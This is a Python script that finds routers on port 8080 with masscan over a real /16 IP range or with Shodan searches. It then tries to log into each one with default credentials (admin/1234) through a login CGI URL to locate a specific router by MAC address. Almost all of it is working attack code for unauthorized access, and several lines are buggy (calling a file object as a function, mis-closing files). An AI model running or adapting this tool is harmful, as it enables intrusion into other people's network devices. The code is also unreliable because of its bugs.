#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DEVELOPED BY Di0nJ@ck - August 2017 - v1.0
__author__      = 'Di0nj@ck'
__version__     = 'v1.0'
__last_update__ = 'August 2017'


import sys, re, os
import shodan
import requests
from threading import Thread
from queue import Queue
import subprocess

concurrent = 10
q = Queue(concurrent * 2)


def try_host():
    while True:
        router_mac = "10:5F:49:F9:1E:F1" #OUR TARGET ROUTER MAC (IF APPLIES, IF IT DOESNT, COMMENT THIS LINE)
        file_routerfind = open("Router_Access", "w")

        url = q.get()
        print ("      * Trying to access into the url: " + url + '\n')

        try:
            resp = requests.get(url, timeout=1)
            if resp.status_code is 200:
                print ("         - OK. Device is alive!" + '\n')
                r_content = resp.text
                print ("         - Extracting router MAC address..." + '\n')
                if r_content.find(router_mac) >= 0:
                    print ("         - CONGRATZ!!! Device found!" + '\n')
                    file_routerfind.write(url)
                    sys.exit()
                else:
                    print ("         - FAIL. This is not the device we are searching for..." + '\n')
            else:
                print ("         - Error. Not 200 OK" + '\n')
                print ("         - Status code: " + str(resp.status_code) + "\n")
        except Exception as e:
            print ("         - Error. The URL is not accessible. " + str(e) + '\n')

        file_routerfind.close()

        q.task_done()

def access_router():
    router_username = "admin"
    router_password = "1234"
    router_login = "/processlogin.cgi?loginUsername=" + router_username + "&loginPassword=" + router_password #YOU SHOULD CUSTOMIZE THIS

    file_url = open("IPs_8080", "r")

    num_lines = sum(1 for line in open("IPs_8080"))

    for i in range(concurrent):
        t = Thread(target=try_host)
        t.daemon = True
        t.start()

    i = 1
    try:
        while i <= num_lines:
            ip = file_url.readline().rstrip('\n')
            DP_url = "https://" + str(ip) + router_login
            q.put(DP_url)
            i += 1
        file_url.close()
        q.join()
    except KeyboardInterrupt:
        sys.exit(1)

# SHODAN API SEARCH
def search_shodan(ofile):
    #PARAMETERS
    Shodan_key = "insert your Shodan API key here"
    search_query = "your Shodan search query"

    i = 1
    file_Shodan = open(ofile, "w")  # SHODAN RESULTS FILE

    while i <= 80: #RETRIEVE FIRST 80 PAGES FROM SHODAN RESULTS
        try:
            api = shodan.Shodan(Shodan_key)
            results = api.search(str(search_query), page=i)
        except Exception as e:
            print ('Error: %s' % e)
            sys.exit(1)

        for host in results['matches']:
            print ("IP: " + str(host['ip_str']))
            print ("Server: " + str(host['product']))
            print ("Router: " + str(host['title']))
            print ("Port: " + str(host['port']))
            print ("Hostname: " + str(host['hostnames']))
            print ("Last update: " + str(host['timestamp']))
            print ("ISP: " + str(host['isp']))
            print ("Geolocation: " + str(host['location']))
            print ('')
            file_Shodan.write(host['ip_str'] + ':' + str(host['port']))
            file_Shodan.write('\n')
        i = i + 1
    file_Shodan().close
    print ('Results have been stored on: %s' % file_Shodan)


# MASSIVE PORT SCAN WITH 'MASSCAN' TOOL
def masscan(ofile):
    #PARAMETERS
    port = "8080" #OR WHATEVER TARGET PORT
    IP_range = "148.101.0.0/16" #OR WHATEVER CIDR IP RANGE TARGET
    temp_ofile= ofile + "_temp"

    #MASSCAN RUN
    print ("\n\n- Analyzing the CIDR range..." + "\n")

    file_masscan_temp = open(temp_ofile, "w")
    mycommand = "masscan -p" + port + " " + IP_range + " --rate 1000000 -oL " + temp_ofile + "\n"

    try:
        print ("        - In progress..." + "\n")
        subprocess.check_output(mycommand, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        print ("ERROR. Masscan has failed. " + str(e) + "\n")
    file_masscan_temp.close()

    print ("        - The following IPs have been found: " + "\n")

    #GENERATE RESULTS DATA
    file_masscan_temp = open(temp_ofile, "r")
    file_masscan = open(ofile, "w")
    i=1
    num_lines = sum(1 for line in open(temp_ofile))
    while i <= num_lines:
        ip = file_masscan_temp.readline().rstrip('\n')
        m = re.search('[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+', ip)
        if m:
            ip = m.group(0) + ":8080"
            file_masscan(ip)
            file_masscan.write('\n')
        i += 1

    print ("        - OK. Masscan search has finished!" + "\n\n")
    file_masscan_temp.close()
    os.remove("./" + ofile + "_temp")
    file_masscan.close()

# SEARC HOSTS METHOD, MASSCAN OR SHODAN
def search_hosts(method):
    #PARAMETERS
    ofile_masscan_name = "IPs_8080"
    ofile_shodan_name = "IPs_8080"

    if method == "masscan":
        masscan(ofile_masscan_name)
    if method == "shodan":
        search_shodan(ofile_shodan_name)

def main():
    #PARAMETERS
    scan_method = "masscan" #CHOOSE BETWEEN MASSCAN OR SHODAN FOR FINDING TARGET DEVICES
    #scan_method = "shodan"

    search_hosts(scan_method)

    # TRYING TO AUTOMATICALLY LOGIN INTO FOUND ROUTER USING DEFAULT CREDENTIALS
    print ("- Trying to log into router with default credentials..." + "\n")
    access_router()
main()
